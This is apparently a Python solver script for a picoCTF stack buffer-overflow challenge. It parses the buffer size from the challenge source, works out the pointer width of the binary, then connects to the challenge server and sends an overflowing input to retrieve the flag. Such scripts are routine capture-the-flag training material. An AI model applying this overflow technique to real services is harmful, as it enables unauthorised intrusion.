#!/usr/bin/env python3

import re
import socket
import subprocess

from pexpect import fdpexpect

import sys

sys.path.insert(1, '../..')
from utils import download_artifacts

download_artifacts()

source_filename = "vuln.c"
binary_filename = "vuln"

with open(source_filename) as fp:
    for line in map(str.strip, fp.readlines()):
        match = re.match(r"char\s+buf2\[(\d+)];", line)
        if match:
            buffer_size = int(match.group(1))
            break
address_length_in_bits = int(re.match(binary_filename + r": ELF (\d+)-bit",
                                      subprocess.check_output(["file", binary_filename]).decode()).group(1))

overflow_size = buffer_size + address_length_in_bits // 8
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(("saturn.picoctf.net", 64712))
    session = fdpexpect.fdspawn(s.fileno(), timeout=10)
    session.expect(b"Input:")
    session.write(b' ' * overflow_size + b'\n')
    session.expect(rb"picoCTF\{.+}")
    print(session.match.group(0).decode())
